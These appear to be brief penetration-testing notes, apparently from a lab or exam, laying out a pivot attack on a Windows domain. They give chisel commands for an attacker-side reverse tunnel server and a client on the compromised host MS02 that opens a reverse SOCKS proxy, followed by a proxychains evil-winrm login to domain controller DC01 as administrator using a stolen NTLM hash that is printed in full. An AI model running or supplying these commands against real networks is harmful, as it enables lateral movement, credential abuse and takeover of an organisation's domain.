## Attacker Server
./chisel_1.9.1_linux_amd64 server -p 4444 --reverse

## Pivot Machine MS02
.\chisel.exe client 192.168.45.185:4444 R:socks

## Remote Connection to DC01 with stolen NTLM hash
proxychains evil-winrm -i 10.10.83.152 -u administrator -H 59b280ba707d22e3ef0aa587fc29ffe5
